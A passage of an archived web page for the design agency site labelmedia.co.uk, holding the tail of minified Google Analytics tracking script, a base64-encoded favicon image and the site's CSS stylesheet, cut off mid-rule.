b.add("utmvp",a.get(Rb)),b.add("utmsc",a.get(Mb)),b.add("utmul",a.get(Pb)),=
b.add("utmje",a.get(Nb)),b.add("utmfl",a.get(Ob),h))},we=3Dfunction(a,b){a.=
get(lb)&&a.get(Ib)&&b.add("utmdt",a.get(Ib),h);b.add("utmhid",a.get(Kb));b.=
add("utmr",Pa(a.get(Jb),a.get(P)),h);b.add("utmp",G(a.get(Hb),h),h)},xe=3Df=
unction(a,b){for(var c=3Da.get(Db),d=3Da.get(Eb),e=3Da.get(Fb)||[],f=3D0;f<=
e[w];f++){var Be=3De[f];Be&&(c||(c=3Dnew yd),c.f(8,f,Be[r]),c.f(9,f,Be[na])=
,3!=3DBe[ua]&&c.f(11,f,""+Be[ua]))}!F(a.get(wc))&&!F(a.get(xc),h)&&(c||
(c=3Dnew yd),c.f(5,1,a.get(wc)),c.f(5,2,a.get(xc)),e=3Da.get(yc),e!=3Dg&&c.=
f(5,3,e),e=3Da.get(zc),e!=3Dg&&c.o(5,1,e));c?b.add("utme",c.Qa(d),h):d&&b.a=
dd("utme",d.A(),h)},ye=3Dfunction(a,b,c){var d=3Dnew qe;re(a,c);se(a,d);d.a=
dd("utmt","tran");d.add("utmtid",b.id_,h);d.add("utmtst",b.affiliation_,h);=
d.add("utmtto",b.total_,h);d.add("utmttx",b.tax_,h);d.add("utmtsp",b.shippi=
ng_,h);d.add("utmtci",b.city_,h);d.add("utmtrg",b.state_,h);d.add("utmtco",=
b.country_,h);xe(a,d);ve(a,d);we(a,d);(b=3Da.get(Gb))&&d.add("utmcu",
b,h);c||(ue(a,d),te(a,d));return d[v]()},ze=3Dfunction(a,b,c){var d=3Dnew=
 qe;re(a,c);se(a,d);d.add("utmt","item");d.add("utmtid",b.transId_,h);d.add=
("utmipc",b.sku_,h);d.add("utmipn",b.name_,h);d.add("utmiva",b.category_,h)=
;d.add("utmipr",b.price_,h);d.add("utmiqt",b.quantity_,h);xe(a,d);ve(a,d);w=
e(a,d);(b=3Da.get(Gb))&&d.add("utmcu",b,h);c||(ue(a,d),te(a,d));return d[v]=
()},Ae=3Dfunction(a,b){var c=3Da.get(sc);if("page"=3D=3Dc)c=3Dnew qe,re(a,b=
),se(a,c),xe(a,c),ve(a,c),we(a,c),b||(ue(a,c),te(a,c)),c=3D[c[v]()];else if=
("event"=3D=3D
c)c=3Dnew qe,re(a,b),se(a,c),c.add("utmt","event"),xe(a,c),ve(a,c),we(a,c),=
b||(ue(a,c),te(a,c)),c=3D[c[v]()];else if("var"=3D=3Dc)c=3Dnew qe,re(a,b),s=
e(a,c),c.add("utmt","var"),!b&&te(a,c),c=3D[c[v]()];else if("trans"=3D=3Dc)=
for(var c=3D[],d=3Da.get(Cb),e=3D0;e<d[w];++e){c[n](ye(a,d[e],b));for(var=
 f=3Dd[e].items_,Be=3D0;Be<f[w];++Be)c[n](ze(a,f[Be],b))}else"social"=3D=3D=
c?b?c=3D[]:(c=3Dnew qe,re(a,b),se(a,c),c.add("utmt","social"),c.add("utmsn"=
,a.get(Ac),h),c.add("utmsa",a.get(Bc),h),c.add("utmsid",a.get(Cc),h),xe(a,c=
),ve(a,c),we(a,
c),ue(a,c),te(a,c),c=3D[c[v]()]):"feedback"=3D=3Dc?b?c=3D[]:(c=3Dnew qe,re(=
a,b),se(a,c),c.add("utmt","feedback"),c.add("utmfbid",a.get(Gc),h),c.add("u=
tmfbpr",a.get(Hc),h),xe(a,c),ve(a,c),we(a,c),ue(a,c),te(a,c),c=3D[c[v]()]):=
c=3D[];return c},oe=3Dfunction(a){var b,c=3Da.get(xb),d=3Da.get(uc),e=3Dd&&=
d.Ua,f=3D0;if(0=3D=3Dc||2=3D=3Dc){var Be=3Da.get(wb)+"?";b=3DAe(a,h);for(va=
r k=3D0,s=3Db[w];k<s;k++)Sa(b[k],e,Be,h),f++}if(1=3D=3Dc||2=3D=3Dc){b=3DAe(=
a);k=3D0;for(s=3Db[w];k<s;k++)try{Sa(b[k],e),f++}catch(t){t&&Ra(t[r],g,t.me=
ssage)}}d&&(d.q=3Df)};var Ce=3Dfunction(a){ha(this,"len");this.message=3Da+=
"-8192"},De=3Dfunction(a){ha(this,"ff2post");this.message=3Da+"-2036"},Sa=
=3Dfunction(a,b,c,d){b=3Db||Fa;if(d||2036>=3Da[w])gf(a,b,c);else if(8192>=
=3Da[w]){if(0<=3DW[za].userAgent[q]("Firefox")&&![].reduce)throw new De(a[w=
]);hf(a,b)||Ee(a,b)}else throw new Ce(a[w]);},gf=3Dfunction(a,b,c){c=3Dc||(=
Ne()||M.G?"https://ssl.google-analytics.com":"http://www.google-analytics.c=
om")+"/__utm.gif?";var d=3Dnew Image(1,1);d.src=3Dc+a;He(d,function(){He(d,=
Ge);Ie(d,Ge);b()});Ie(d,function(){He(d,
Ge);Ie(d,Ge);b()})},hf=3Dfunction(a,b){var c,d=3D(Ne()||M.G?"https://ssl.go=
ogle-analytics.com":"http://www.google-analytics.com")+"/p/__utm.gif",e=3DW=
.XDomainRequest;if(e)c=3Dnew e,c.open("POST",d);else if(e=3DW.XMLHttpReques=
t)e=3Dnew e,"withCredentials"in e&&(c=3De,c.open("POST",d,h),c.setRequestHe=
ader("Content-Type","text/plain"));if(c)return c.onreadystatechange=3Dfunct=
ion(){4=3D=3Dc.readyState&&(b(),c=3DGe)},c.send(a),h},Ee=3Dfunction(a,b){if=
(J.body){a=3Daa(a);try{var c=3DJ[qa]('<iframe name=3D"'+a+'"></iframe>')}ca=
tch(d){c=3D
J[qa]("iframe"),ha(c,a)}c.height=3D"0";c.width=3D"0";c.style.display=3D"non=
e";c.style.visibility=3D"hidden";var e=3DJ[z],e=3D(Ne()||M.G?"https://ssl.g=
oogle-analytics.com":"http://www.google-analytics.com")+"/u/post_iframe.htm=
l#"+aa(e[A]+"//"+e[u]+"/favicon.ico"),f=3Dfunction(){c.src=3D"";c.parentNod=
e&&c.parentNode.removeChild(c)};Ga(W,"beforeunload",f);var Be=3Dl,k=3D0,s=
=3Dfunction(){if(!Be){try{if(9<k||c.contentWindow[z][u]=3D=3DJ[z][u]){Be=3D=
h;f();Ha(W,"beforeunload",f);b();return}}catch(a){}k++;ca(s,200)}};Ga(c,"lo=
ad",s);
J.body.appendChild(c);c.src=3De}else We(function(){Ee(a,b)},100)};var $=3Df=
unction(){this.G=3Dthis.w=3Dl;this.C=3D{};this.D=3D[];this.U=3D0;this.S=3D[=
["www.google-analytics.com","","/plugins/"]];this._gasoCPath=3Dthis._gasoDo=
main=3Dg;Re();Se()};E=3D$[x];E.oa=3Dfunction(a,b){return this.r(a,g,b)};E.r=
=3Dfunction(a,b,c){b&&H(23);c&&H(67);b=3D=3Dg&&(b=3D"~"+M.U++);a=3Dnew U(b,=
a,c);M.C[b]=3Da;M.D[n](a);return a};E.u=3Dfunction(a){a=3Da||"";return M.C[=
a]||M.r(g,a)};E.pa=3Dfunction(){return M.D[ja](0)};E.aa=3Dfunction(){this.w=
=3Dh};E.la=3Dfunction(){this.G=3Dh};var Fe=3Dfunction(a){if("prerender"=3D=
=3DJ.webkitVisibilityState)return l;a();return h};var M=3Dnew $;var jf=3DW.=
_gat;jf&&Ba(jf._getTracker)?M=3Djf:W._gat=3DM;var Z=3Dnew Y;(function(a){if=
(!Fe(a)){H(123);var b=3Dl,c=3Dfunction(){!b&&Fe(a)&&(b=3Dh,Ha(J,"webkitvisi=
bilitychange",c))};Ga(J,"webkitvisibilitychange",c)}})(function(){var a=3DW=
._gaq,b=3Dl;if(a&&Ba(a[n])&&(b=3D"[object Array]"=3D=3DObject[x][v].call(Ob=
ject(a)),!b)){Z=3Da;return}W._gaq=3DZ;b&&Z[n][ya](Z,a)});function Yc(a){var=
 b=3D1,c=3D0,d;if(a){b=3D0;for(d=3Da[w]-1;0<=3Dd;d--)c=3Da.charCodeAt(d),b=
=3D(b<<6&268435455)+c+(c<<14),c=3Db&266338304,b=3D0!=3Dc?b^c>>21:b}return=
 b};})();

------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://www.labelmedia.co.uk/assets/images/favicon.png
Content-Transfer-Encoding: base64
Content-Type: image/png

iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJ
bWFnZVJlYWR5ccllPAAAAsZJREFUeNqM02tIFFEUAOAzM7s766662+Yz141F3bU2E7FMMwqkH6WE
9DApoSDF+l0IVmAFERX+yB9ZhClEL0TIklWyHxlhihHpktSalo9WW9fntM/ZnbmdMQUplS58zDD3
3sOZe8+hSHYe/DMIYrxQVHIRmjbvB+C9SzPb0XG0A71FN2n4v7EBtaBWpENWVIzyZWvvYxBlxudr
AHkXCLQF6MAkUII0eRDtXjNAJO8OB5puVBNPnUFur2J10/CVywJPUINxhSkps78DhKHCBRQdX9H/
QGeS2yyaqNEm2jCe6EoKjHXOFUCb/awUQFo7tfwM8lE/qgK/e7A9OfNh2Z7KODXDXdfT3zN/sUqb
W4isNmm7KQ07qgIiT8C1n6QMpCCnUTWqAN5/pyM1ixQVX9nJqddNOznd1UvCOZ8/gqQHVMxjpXc+
RQ+25nlI8gGIVmkz5gO30GEIBWsH4oyk4NQ14FhVMvi5n4OsyfeMPQJRnK9PMQMZnD2aEV3R9Qpx
ukYBXI+UQfvif5/AA3sZ4+XIlolv0GNMk0GIF4BlIL9xEkp7PfBuo5FvNu7ypBkGIMdca2cUwkL6
NnQIpQLNfNC6Z7Pa7p+HnKG+IQiPiD3T+URe2o3X71dm613evpyR4fVG85t6bcpMuSbRo146RBfK
XchGxrboPHNdDU9vlCfwvfoDn1/dBW+oC2TMc8OsyxrDOPYGLZ46IioyRYHZtvwW8FCgEut4KyjC
7pkdPxzHhqxfXpTFFjrTVDUQIJsgSF0YzpuDgJYfoQRKieuTViokJ4jQIGrlEBk7Fj+eG+iuManU
UQ4yIzIUTBp4UHgpqVso6QZXrsQAAXu2Apz7xifi3eSkL5xuHbZQRpy5LOMhhNsT8Z1Ho6uWMkUI
UCKNjUk6aAFy0SP8fBTdRumLRfd+9V4gi/6MjygDFaEShA0GZWj2twADAFjqCEzBw3bIAAAAAElF
TkSuQmCC

------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://www.labelmedia.co.uk/assets/css/default.css
Content-Transfer-Encoding: quoted-printable
Content-Type: text/css

@CHARSET "UTF-8";

h1,h2,h3,h4,h5,h6,pre,code { font-size:1em; }
ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,html,p,blockquote,fieldset,input,object=
 { margin:0; padding:0 }
a img,:link img,:visited img { border:none }

body {
	font-family: Georgia, times, "times new roman", serif;
	font-size: 12px;
	margin: 0;
}
.clear {
	clear: both;
}

.header {
	height: 100px;
	background: #051b29;
}
.header .logo {
	display: block;
	background: url('../images/logo.png') no-repeat;
	width: 291px;
	height: 53px;
	text-indent: -9000px;
	position: absolute;
	top: 20px;
	left: 0;
}
.header ul {
	list-style: none;
	font-size: 22px;
	height: 40px;
	position: absolute;
	top: 36px;
	right: 0;
}
.header ul li {
	display: inline;
}
.header ul li a {
	display: block;
	float: left;
	color: #fff;
	text-decoration: none;
	padding: 0 0 0 30px;
	outline: none;
=09
	-webkit-transition: color 0.2s ease-out;
	-moz-transition: color 0.2s ease-out;
	-o-transition: color 0.2s ease-out;
	transition: color 0.2s ease-out;
}
.header ul li a:hover {
	color: #ccc;
}

hr,
div.hr {
	height: 1px;
	border: 0;
	border-top: 1px dashed #666;
	margin-bottom: 10px;
	color: #fff;
	background: #fff;
}
div.hr hr {
	display: none;
}

.contentContainer {
	width: 974px;
	margin: 0 auto;
	position: relative;
}
.pageContent {
	text-align: left;
	min-height: 176px;
	padding-top: 20px;
}
.pageContent .wideColumn {
	width: 670px;
	float:left;
	padding-top: 10px;
	overflow: hidden;
}
.pageContent .narrowColumn {
	width: 26%;
	float: left;
	padding: 10px 0 0 5%;
	overflow: hidden;
}
.pageContent .narrowColumn:first-child {
	padding: 10px 5% 0 0;
}
.aboutPage .wideColumn {
	width: 60%;
}
.aboutPage .narrowColumn {
	width: 35%;
}

.pageContent .banner {
	margin-bottom: 20px;
}

h1, h2, h3, h4 {
	font-weight: normal;
	color: #373737;
	letter-spacing: -0.03em;
	margin-bottom: 10px;
}
h1 {
	font-size: 30px;
	border-bottom: 1px dotted #aba7a7;
	padding-bottom: 20px;
	margin-bottom: 20px;
	line-height: 35px;
}
.homepage h1 {
	line-height: 36px;
	border: 0;
	padding: 0;
	margin: 0;
}
h2 {
	font-size: 26px;
	line-height: 32px;
}
h3 {
	font-size: 22px;
}
h4 {
	font-size: 18px;
}

.cmText {
	font-size: 15px;
	line-height: 22px;
}
.cmText ul {
	margin-bottom: 15px;
	margin-left: 20px;
}
.pageContent p,
.pageContent ul,
.pageContent ol {
	font-size: 15px;
	margin-bottom: 15px;
	line-height: 22px;
}
.pageContent ul,
.pageContent ol {
	margin-left: 20px;
}
.pageContent a {
	color: #00b9f2;
	text-decoration: none;
=09
	-webkit-transition: color 0.2s ease-out;
	-moz-transition: color 0.2s ease-out;
	-o-transition: color 0.2s ease-out;
	transition: color 0.2s ease-out;
}
.pageContent a:hover {
	color: #7de0ff;
}
.pageContent .contentRegion img {
	float: right;
	margin: 0 0 20px 20px;
}
.pageContent .features {
	margin: 0 -15px;
	width: 700px;
}
.pageContent .features hr {
	display: none;
}
.pageContent .features ul {
	float: left;
	width: 305px;
	height: 120px;
	border: 1px dotted #aba7a7;
	padding: 10px;
	margin: 0 0 15px 15px;
	list-style: none;
=09
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
.pageContent .features ul li {
	font-size: 20px;
}
.pageContent .features ul li ul {
	float: none;
	width: auto;
	height: auto;
	border: 0;
	list-style: disc;
	margin: 10px 0 0 20px;
	padding: 0;
}
.pageContent .features ul li ul li {
	font-size: 14px;
	color: #333;
}

.pageContent .howWeWork .steps {
	margin-top: 20px;
}
.pageContent .howWeWork .step {
	clear: both;
	padding-top: 30px;
}
.pageContent .howWeWork .step1 img,
.pageContent .howWeWork .step3 img,
.pageContent .howWeWork .step5 img {
	float: right;
	margin: -30px 0 0 30px;
}
.pageContent .howWeWork .step2 img,
.pageContent .howWeWork .step4 img,
.pageContent .howWeWork .step6 img {
	float: left;
	margin: -30px 30px 0 0;
}
.pageContent .howWeWork .step3 img {
	margin-bottom: 40px;
}
.pageContent .howWeWork .step p {
	font-size: 16px;
	line-height: 23px;
}

button, a.button {
	border: 1px solid #ccc8c8;
	line-height: 33px;
	text-align: center;
	background: url('../images/buttonBg.png') repeat-x;
	color: #494949;
	font-size: 18px;
	height: 37px;
	padding-left: 15px;
	padding-right: 15px;
	text-decoration: none;
	cursor: pointer;
	font-family: arial, sans-serif;
	letter-spacing: -0.02em;
=09
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
a.button {
	height: 18px;
	padding-top: 7px;
	padding-bottom: 7px;
}
button:hover, a.button:hover {
	background-position: 0 -37px;
	color: #666;
}

.homeBanner {
	height: 405px;
	text-align: center;
	background: #0f1213;
	margin-bottom: 70px;
}

.homepage .intro {
	float: left;
	width: 55%;
	min-height: 200px;
	margin-bottom: 30px;
}
.homepage .twitter {
	float: left;
	width: 35%;
	margin-left: 10%;
	margin-bottom: 30px;
}
.homepage .twitter ul {
	list-style: none;
	margin: 0 !important;
}
.homepage .twitter ul li {
	margin: 0 0 10px 0;
}
.homepage h2 {
	font-size: 22px;
	border-bottom: 1px dotted #aba7a7;
	padding-bottom: 5px;
}
.homepage h2 a {
	display: block;
	float: right;
	font-size: 15px;
	line-height: 35px;
}
.homepage h2 a:hover {
	color: #7de0ff;
}
.homepage .work,
.homepage .blog,
.homepage .clients {
	margin-bottom: 30px;
}
.homepage .work img {
	float: left;
}
.homepage .work a:first-child img {
	margin-right: 17px;
}
.homepage .blog {
	margin-left: -10px;
	margin-right: -10px;
	width: 994px;
}
.homepage .blog .post {
	width: 477px;
	margin: 0 10px;
	float: left;
}
.homepage .blog .post p {
	display: inline;
}

.quoteContainer {
	clear: both;
	height: 215px;
	margin-top: 50px;
	background: #f3f7f7;
	border-top: 1px solid #eaefef;
}
.quoteContainer .quote,
.quoteContainer .contact {
	float: left;
	width: 55%;
}
.quoteContainer .quote p {
	color: #373737;
	font-size: 20px;
	line-height: 22px;
	margin-top: 60px;
}
.quoteContainer .quote cite {
	color: #718582;
	font-size: 15px;
}
.quoteContainer .contact {
	margin: 10px 0 0 5%;
	width: 39%;
	position: relative;
	border-left: 1px solid #d1d7d7;
}
.quoteContainer .contact img {
	position: absolute;
	top: -65px;
	left: 20px;
}
.quoteContainer .contact .enquire {
	padding: 0 0 0 120px;
}
.quoteContainer .contact .enquire p {
	color: #718582;
	font-size: 13px;
}
.listing.post h3 small {
	font-size: 13px;
	letter-spacing: 0;
	color: #6d6d6d;
}
.blog a.rss {
	display: block;
	background: url('../images/icons/feed.png') no-repeat;
	padding: 0 0 0 20px;
	height: 16px;
	line-height: 16px;
}
.blog .post {
	margin-bottom: 30px;
}
.blog .date {
	font-size: 14px;
	font-style: italic;
	color: #6d6d6d;
	margin: -5px 0 15px 0;
	border-bottom: 1px dotted #aba7a7;
	padding-bottom: 15px;
}
.blog .listing.post .date {
	border-bottom: 0;
	padding-bottom: 0;
}
.blog .date .social {
	float: right;
	margin-top: -2px;
}
.blog .post .opening {
	margin-bottom: 20px;
}
.blog .post .opening p {
	font-weight: bold;
}

.blog a.primary img,
.blog img.primary {
	margin-bottom: 5px;
	border: 5px solid #ddd;
}
.blog .post p + h1,
.blog .post p + h2,
.blog .post p + h3,
.blog .post p + h4 {
	padding-top: 10px;
}
.blog .post pre,
.blog .post code {
	font-size: 11px;
}
.blog .post pre {
	margin-bottom: 15px;
	background: #e6e6e6;
	color: #006600;
	padding: 5px;
	border: 1px solid #ccc;
}

.comment {
	border-bottom: 1px dotted #aba7a7;
	margin-bottom: 15px;
}

.comment .gravatar {
	display: block;
	width: 48px;
	float: left;
}

.comment .body {
	width: 600px;
	float: right;
}

.comment .body .name {
	margin-bottom: 5px;
	font-size: 16px;
}
.comment .body .date {
	margin-bottom: 10px;
	padding-bottom: 0;
	border: 0;
}

.formDynamic.addComments {
	margin-bottom: 30px;
	margin-top: 0;
	padding-top: 0;
}

.blogCategories {
	list-style: none;
	margin: 0 0 10px 0 !important;
}
.blogCategories li.selected a {
	color: #0093c0;
}
.blogCategories li.selected a:hover {
	color: #7de0ff;
}

.pagination {
	float: right;
}
.pagination ul {
	clear: both;
	list-style: none;
	margin: 0;
}
.pagination ul li {
	float: left;
	margin-left: 5px;
	line-height: 26px;
}
.pagination ul li a {
	display: block;
	float: left;
	text-decoration: none;
	line-height: 22px;
}
.pagination ul li.current a {
	font-size: 24px;
}

.theTeam .person {
	margin-bottom: 15px;
	height: 105px;
}
.theTeam .person img {
	float: left;
	margin-right: 15px;
}
.theTeam .person h4 {
	font-size: 20px;
}
.theTeam .person h5 {
	padding: 30px 0 5px 0;
	color: #2bb8f0;
	font-size: 14px;
}

.workPage .work,
.workPage .clients {
	padding-bottom: 20px;
}

.workPage .work .projects {
	margin: 10px -8px 0 -8px;
	width: 990px;
}
.workPage .work .projects .project {
	float: left;
	margin: 0 7px 12px 7px;
}

.workPage .clients .logos,
.workPage .clients .lists {
	width: 47%;
	float: left;
	overflow: hidden;
}
.workPage .clients .logos {
	margin-right: 4%;
	width: 48%;
}
.workPage .clients p {
	float: left;
	width: 31%;
	margin-left: 3%;
	overflow: hidden;
}
.workPage .clients p:first-child {
	margin: 0;
}
.workPage .project .creds img {
	float: left;
	margin: 0 50px 50px 0;
}
.workPage .project .creds ul {
	list-style: none;
	margin: 0;
	padding-top: 0px;
	font-size: 18px;
}
.workPage .project .creds ul li {
	margin-bottom: 10px;
}
.workPage .project .creds ul li.back {
	padding-bottom: 25px;
	font-size: 14px;
}
.workPage .project .creds ul li.buttons {
	margin-top: 50px;
}
.workPage .project .creds ul li label {
	display: block;
	color: #666;
	font-size: 14px;
	margin: 0;
}
.workPage .project .description {
	float: left;
	width: 665px;
	margin-right: 50px;
	position: relative;
}

.workPage .project .description .prevNext {
	position: relative;
	right: 0;
	top: 0;
}

.workPage .project .description .prevNext a.next {
	width: 35px;
	height: 35px;
	display: block;
	text-indent: -9000px;
	background: url("../images/work-right.png") no-repeat;
	float: right;
	background-position: 0px 0px;
}

.workPage .project .description .prevNext a.next:hover {
	background-position: 0px -35px;
}

.workPage .project .description .prevNext a.prev {
	width: 35px;
	height: 35px;
	display: block;
	text-indent: -9000px;
	background: url("../images/work-left.png") no-repeat;
	float: right;
	margin-right: 5px;
	background-position: 0px 0px;
}

.workPage .project .description .prevNext a.prev:hover {
	background-position: 0px -35px;
}

.workPage .project .disciplines {
	float: left;
	width: 259px;
}

.workPage .filterContainer {
	border-bottom: 1px dotted #aba7a7;
	margin: -10px 0 25px 0;
	padding-bottom: 10px;
}
.workPage .filterContainer ul {
	list-style: none;
	margin: 0 !important;
	font-family: arial, sans-serif;
	font-size: 12px;
	float: left;
}
.workPage .filterContainer ul.filters {
	width: 800px;
}
.workPage .filterContainer ul.filters li label {
	display: block;
	float: left;
	font-size: 15px;
	font-family: Georgia, times, "times new roman", serif;
	margin-right: 20px;
	color: #363636;
	padding-top: 2px;
}
.workPage .filterContainer ul.filters li ul li {
	display: inline;
}
.workPage .filterContainer ul.filters li ul li a {
	color: #787878;
	display: block;
	padding: 1px 15px;
	border: 1px solid #bbbbbb;
	text-align: center;
	float: left;
	-moz-border-radius: 15px;
	-webkit-border-radius: 15px;
	border-radius: 15px;
	margin-right: 5px;
	background: #ebeded;
=09
	-webkit-transition: background-color 0.2s ease-out;
	-moz-transition: background-color 0.2s ease-out;
	-o-transition: background-color 0.2s ease-out;
	transition: background-color 0.2s ease-out;
}
.workPage .filterContainer ul.filters li ul li a.applied, .workPage .filter=
Container ul.filters li ul li a:hover {
	color: #ffffff;
	background: #a6a6a6;
	border: 1px solid #7a7a7a;
}

.workPage .project {
	position: relative;
}
.workPage .project .projectRollover {
	width: 191px;
	height: 104px;
	position: absolute;
	top: 0;
	left: 0;
	visibility: hidden;
	padding: 20px;
	background: url("../images/bg-work.png") repeat;
	color: #ffffff;
	font-size: 13px;
}
.workPage .project .projectRollover .projectName {
	padding-bottom: 10px;
}
.workPage .project .projectRollover .projectName a {
	font-size: 17px;
}
.workPage .project .projectRollover .projectLinks {
	position: absolute;
	bottom: 20px;
	left: 20px;
}
.workPage .project .projectRollover .projectLinks a {
	text-decoration: underline;
	font-size: 13px;
}
=09
.workPage .hoverEffect:hover .projectRollover, .workPage .hoverEffect .proj=
ectRollover:hover {
	visibility: visible;
}

.workPage .project .projectRollover h1 {
	color: #00b9f2;
}

.workPage .project .projectRollover a {
	color: #00b9f2;
}

.workPage .disciplines .filterContainer {
	width: 259px;
}

.workPage .disciplines .filterContainer ul {
	width: 259px;
}

.workPage .disciplines .filterContainer ul li label {
	display: none;
}

.workPage .disciplines .filterContainer ul li ul li a {
	margin-bottom: 5px;
}

.pricing .top {
	background: #e7f9ff;
	border: 1px solid #c6f1ff;
	margin-bottom: 15px;
	padding: 10px;
	color: #333;
=09
	-moz-border-radius: 2px;
	-webkit-border-radius: 2px;
	border-radius: 2px;
}
.pricing .top {
=09
}
.pricing .top ul {
	list-style-type: square;
}
.pricing .top ul li {
	width: 50%;
	float: left;
}
.pricing .tables {
	margin: 0 0 15px -15px;
}
.pricing table {
	float: left;
	margin: 0 0 0 15px;
	width: 213px;
	border: 1px solid #EAEFEF;
	background: #F3F7F7;
	font-size: 14px;
	padding: 2px;
=09
	-moz-border-radius: 2px;
	-webkit-border-radius: 2px;
	border-radius: 2px;
}
.pricing table tr th,
.pricing table tr td {
	padding: 5px;
}
.pricing table th {
	height: 26px;
=09
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	border-radius: 5px;
}
.pricing table.standard th {
	background: #FF3842 url('../images/redGrad.png') repeat-x;
	border: 1px solid #FF3842;
}
.pricing table.advanced th {
	background: #72F04E url('../images/greenGrad.png') repeat-x;
	border: 1px solid #72F04E;
}
.pricing table.enterprise th {
	background: #00B9F2 url('../images/blueGrad.png') repeat-x;
	border: 1px solid #00B9F2;
}
.pricing table td {
	color: #333;
}
.pricing table td.items {
	background: url('../images/icons/tag-label.png') no-repeat 5px 5px;
	padding-left: 30px;
}
.pricing table td.storage {
	background: url('../images/icons/server.png') no-repeat 5px 5px;
	padding-left: 30px;
}
.pricing table td.bandwidth {
	background: url('../images/icons/network-cloud.png') no-repeat 5px 5px;
	padding-left: 30px;
}
.pricing table td.support {
	background: url('../images/icons/user-green-female.png') no-repeat 5px 5px;
	padding-left: 30px;
}
.pricing table td.cost {
	background: url('../images/icons/money.png') no-repeat 5px 5px;
	padding-left: 30px;
}
.pricing table .button {
	font-size: 14px;
}

.formDynamic {
	padding-top: 20px;
}
.formDynamic .hint {
	font-size: 12px;
	display: block;
}
.formDynamic fieldset {
	border: 0;
}
.formDynamic fieldset ul {
	list-style: none;
	margin: 0 !important;
}
.formDynamic fieldset legend {
	display: none;
}
.formDynamic fieldset ul li {
	margin-bottom: 10px;
}
.formDynamic fieldset ul li label {
	display: block;
	margin-bottom: 5px;
}
.formDynamic fieldset ul li input[type=3D"text"],
.formDynamic fieldset ul li input[type=3D"email"],
.formDynamic fieldset ul li textarea {
	padding-left: 5px;
	padding-right: 5px;
	width: 500px;
	background: #f7f7f7;
	border: 1px solid #999;
	font-family: Georgia, times, "times new roman", serif;
	font-size: 14px;
=09
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
=09
	-webkit-transition: background-color 0.2s ease-out;
	-moz-transition: background-color 0.2s ease-out;
	-o-transition: background-color 0.2s ease-out;
	transition: background-color 0.2s ease-out;
}
.formDynamic fieldset ul li input[type=3D"text"]:hover,
.formDynamic fieldset ul li input[type=3D"text"]:focus,
.formDynamic fieldset ul li input[type=3D"email"]:hover,
.formDynamic fieldset ul li input[type=3D"email"]:focus,
.formDynamic fieldset ul li textarea:hover,
.formDynamic fieldset ul li textarea:focus {
	background: #fff;
}
.formDynamic fieldset ul li input[type=3D"text"]:focus,
.formDynamic fieldset ul li textarea:focus {
	border: 1px solid #00bef7;
}
.formDynamic fieldset ul li input[type=3D"text"],
.formDynamic fieldset ul li input[type=3D"email"] {
	width: 300px;
	height: 22px;
}
.formDynamic fieldset ul li textarea {
	padding: 5px;
	height: 100px;
	display: block;
}
.formDynamic .captcha .help {
	font-size: 12px;
	margin-top: -5px;
}
.formDynamic .captcha .help label {
	display: none;
}
.formDynamic .buttons {
	margin: 20px 0 0 0;
}
.formDynamic .error {
	color: red;
}

.support .formDynamic {
	border-left: 5px solid #EAEFEF;
	margin: 40px 0;
	padding: 5px 0 0 10px;
}
.support .formDynamic fieldset {
	margin: 0 0 10px 0;
}
.support .formDynamic .bottomFields {
	padding-top: 40px;
}
.support .formDynamic .bottomFields fieldset {
	width: 325px;
	float: left;
}
.support .formDynamic fieldset ul li label {
	font-weight: bold;
}
.support .formDynamic fieldset ul li ul {
	padding: 10px 20px 20px 20px;
}
.support .formDynamic fieldset ul li ul li {
	clear: both;
}
.support .formDynamic fieldset ul li ul li input,
.support .formDynamic fieldset ul li ul li label {
	display: inline;
}
.support .formDynamic fieldset ul li ul li label {
	padding: 0 5px;
	height: 20px;
	line-height: 20px;
	font-weight: normal;
}
.support .formDynamic fieldset ul li .hint {
	display: block;
	clear: both;
	font-size: 12px;
	margin-top: -3px;
	font-family: arial, sans-serif;
	color: #666;
}
.support .formDynamic fieldset ul li ul li .hint {
	margin-left: 22px;
}
.support .formDynamic fieldset ul li.buttons {
	text-align: right;
}
.support .sorry {
	margin-bottom: 40px;
	border: 1px solid red;
	padding: 10px;
	background: #F2F1F1;
=09
	-webkit-border-radius: 3px;
	-moz-border-radius: 3px;
	border-radius: 3px;
}
.support .sorry p {
	font-size: 14px;
	line-height: 20px;
	margin: 0;
}

.pageNav {
	list-style: none;
	margin: 0 !important;
}
.pageNav li a {
	display: block;
	width: 200px;
	text-align: right;
	font-size: 16px;
	height: 30px;
	line-height: 30px;
	border-bottom: 1px dotted #aba7a7;
}
.pageNav li.selected a {
	color: #0093c0;
}
.pageNav li.selected a:hover {
	color: #7de0ff;
}

.footer {
	background: #151515 url('../images/footerBg.png') no-repeat top center;
	height: 230px;
	width: 100%;
	color: #fff;
}
.footer .logoSmall {
	background: url('../images/logoSmall.png') no-repeat 0 20px;
	width: 237px;
	height: 63px;
	text-indent: -9000px;
	margin: 0 0 10px 0;
}
.footer a {
	color: #fff;
	text-decoration: none;
=09
	-webkit-transition: color 0.2s ease-out;
	-moz-transition: color 0.2s ease-out;
	-o-transition: color 0.2s ease-out;
	transition: color 0.2s ease-out;
}
.footer a:hover {
	color: #ccc;
}
.footer .copyright {
	padding: 0 0 0 46px;
	font-family: arial, sans-serif;
}
.footer .copyright a {
	text-decoration: underline;
}
.footer .footerNav {
	float: right;
	width: 545px;
	padding: 20px 0 0 0;
}
.footer .footerNav ul {
	float: left;
	width: 100px;
	list-style: none;
	border-left: 1px solid #3e515d;
	padding: 0 15px 0 20px;
	height: 180px;
	font-size: 18px;
}
.footer .footerNav ul:first-child {
	border: 0;
}
.footer .footerNav ul li a {
	font-family: arial, sans-serif;
	font-size: 12px;
}
.footer .footerNav ul li:first-child {
	margin-bottom: 10px;
}

.downloads {
	margin-top: 20px;
	margin-bottom: 20px;
}

.downloads img {
	width: 50px;
	margin-left: -5px;
}

.downloads .download {
	float: left;
	text-align: center;
	font-size: 14px;
}


#oxoxox {
	width: 321px;
	padding-right: 40px;
	float: left;
}

#oxoxox .name {
	font-size: 18px;
}

#oxoxox .score {
